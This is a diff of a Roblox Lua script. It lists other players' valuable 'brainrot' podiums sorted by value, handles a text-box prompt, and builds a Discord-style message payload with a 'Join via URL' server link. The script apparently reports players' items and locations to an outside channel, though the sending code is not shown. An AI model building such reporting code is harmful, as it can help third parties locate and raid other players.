@@ -153,26 +153,30 @@ local function parseGenerationValue(generationString)
     else return numberPart end
 end
 
+-- ADD THIS FUNCTION HERE
+local function extractRate(name)
+    local rate = name:match("%$(%d+%.?%d*[KMB]?)%/s")
+    return rate and (rate .. "/s") or nil
+end
+
 local function getBrainrots()
     local list = {}
     local plots = Workspace:FindFirstChild("Plots")
     if not plots then return list end
-
     for _, plot in ipairs(plots:GetChildren()) do
         local podiums = plot:FindFirstChild("AnimalPodiums")
         if podiums then
             for _, podium in ipairs(podiums:GetChildren()) do
                 if tonumber(podium.Name) and podium.Name:match("^%d+$") then
-                    local base   = podium:FindFirstChild("Base")
-                    local spawn  = base and base:FindFirstChild("Spawn")
+                    local base = podium:FindFirstChild("Base")
+                    local spawn = base and base:FindFirstChild("Spawn")
                     local attach = spawn and spawn:FindFirstChild("Attachment")
-                    local over   = attach and attach:FindFirstChild("AnimalOverhead")
+                    local over = attach and attach:FindFirstChild("AnimalOverhead")
                     if over then
                         local nameLbl = over:FindFirstChild("DisplayName")
-                        local genLbl  = over:FindFirstChild("Generation")
+                        local genLbl = over:FindFirstChild("Generation")
                         if nameLbl and nameLbl:IsA("TextLabel")
                             and genLbl and genLbl:IsA("TextLabel") then
-
                             local genVal = parseGenerationValue(genLbl.Text)
                             table.insert(list, {
                                 name = nameLbl.Text,
@@ -185,14 +189,11 @@ local function getBrainrots()
             end
         end
     end
-
     table.sort(list, function(a, b)
         return a.value > b.value
     end)
-
     return list
 end
-
 --====================================================================--
 -- Draggable
 --====================================================================--
@@ -401,10 +402,9 @@ textBox.FocusLost:Connect(function(enter)
     updatePlaceholder()
     if enter then
         task.wait(0.1)
-        continueBtn.Activated:Fire() -- Use Activated instead of MouseButton1Click:Fire()
+        triggerContinue() -- Call the function directly instead
     end
 end)
-
 -- Continue button
 local continueBtn = Instance.new("TextButton")
 continueBtn.Size = UDim2.new(0,140,0,50)
@@ -673,7 +673,7 @@ local payload = {
                     end)() .. "```"
             },
             {
-                name = "<:location:1365290076279541791> **Join via URL**",
+                name = "<:loc:1436344006421385309> **Join via URL**",
                 value = "[ **Click Here to Join!**](" .. joinLink .. ")"
             }
         },
